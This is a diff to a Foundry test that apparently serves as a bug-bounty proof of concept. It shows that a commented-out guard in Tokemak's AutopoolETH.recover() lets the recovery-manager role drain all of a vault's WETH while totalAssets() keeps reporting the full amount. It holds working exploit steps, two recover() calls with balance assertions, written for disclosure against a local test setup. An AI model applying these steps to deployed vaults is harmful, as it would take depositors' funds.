@@ -1,13 +1,23 @@
 // SPDX-License-Identifier: UNLICENSED
-// PoC for candidate finding: AutopoolETH.recover() lets TOKEN_RECOVERY_MANAGER
-// drain the vault's base asset (WETH). Local Foundry test only, no live target.
-// Scope repo: ~/workspace/bugbounty/autofinance/scope-autofinance-v2-core @ de163d5a
-// Root cause: src/vault/libs/Autopool4626.sol:145-175 — the tracked-asset
-// exclusion guard is commented out (commit 9a19d48e, "temporarily remove recover
-// restrictions", never restored), so recover() transfers ANY token held by the vault.
+/// @title AUTOfinance / Tokemak - AutopoolETH.recover() drains the whole vault
+/// Bug: the tracked-asset exclusion guard in Autopool4626.recover was
+/// commented out in commit 9a19d48e (2024-05-28, "temporarily remove recover
+/// restrictions") and never restored, so recover() transfers ANY token held
+/// by the vault — including its own base asset — to an arbitrary destination.
+/// Impact: the TOKEN_RECOVERY_MANAGER drains a vault holding
+/// 100.0000000000001 WETH down to 0 WETH with two recover() calls. The vault
+/// stays live and unpaused, the user keeps their shares, and totalAssets()
+/// still reports the full amount (silent drain, stale NAV).
+/// Severity: High
+/// Affected: Tokemak v2-core-pub (scope repo commit de163d5a) —
+/// AutopoolETH.recover() (src/vault/AutopoolETH.sol:777) calling
+/// Autopool4626.recover() (src/vault/libs/Autopool4626.sol:145), whose
+/// tracked-asset guard (L159-168) is commented out.
+/// PoC: local Foundry test only, no live target.
 pragma solidity 0.8.17;
 
 import { Test } from "forge-std/Test.sol";
+import { console } from "forge-std/console.sol";
 import { Clones } from "openzeppelin-contracts/proxy/Clones.sol";
 import { Roles } from "src/libs/Roles.sol";
 import { Errors } from "src/utils/Errors.sol";
@@ -101,12 +111,19 @@ contract AutopoolRecoverPoC is Test {
         address[] memory destinations = new address[](1);
         destinations[0] = attacker;
 
+        // BEFORE: vault holds the user's 100 WETH + the 100,000 wei init deposit.
+        console.log("BEFORE: vault WETH (wei):", weth.balanceOf(address(vault)));
+        console.log("BEFORE: attacker WETH (wei):", weth.balanceOf(attacker));
+        console.log("BEFORE: totalAssets (wei):", vault.totalAssets());
+
         // 1) drain the user's 100 WETH — the base asset, on a live unpaused vault
         vm.prank(attacker);
         vault.recover(tokens, amounts, destinations);
 
         assertEq(weth.balanceOf(address(vault)), INIT_DEPOSIT, "vault WETH after 1st recover");
         assertEq(weth.balanceOf(attacker), USER_DEPOSIT, "attacker WETH after 1st recover");
+        console.log("AFTER 1st recover: vault WETH (wei):", weth.balanceOf(address(vault)));
+        console.log("AFTER 1st recover: attacker WETH (wei):", weth.balanceOf(attacker));
 
         // 2) drain the remaining 100_000 wei init deposit too — 100% of vault WETH
         amounts[0] = INIT_DEPOSIT;
@@ -115,6 +132,11 @@ contract AutopoolRecoverPoC is Test {
 
         assertEq(weth.balanceOf(address(vault)), 0, "vault WETH fully drained");
         assertEq(weth.balanceOf(attacker), USER_DEPOSIT + INIT_DEPOSIT, "attacker total drained");
+        console.log("AFTER 2nd recover: vault WETH (wei):", weth.balanceOf(address(vault)));
+        console.log("AFTER 2nd recover: attacker WETH (wei):", weth.balanceOf(attacker));
+        console.log("AFTER 2nd recover: totalAssets (wei, stale):", vault.totalAssets());
+        console.log("AFTER 2nd recover: vault paused:", vault.paused());
+        console.log("AFTER 2nd recover: vault shutdown:", vault.isShutdown());
 
         // vault was never shut down / paused, and the user still holds shares
         assertFalse(vault.isShutdown(), "still not shutdown");
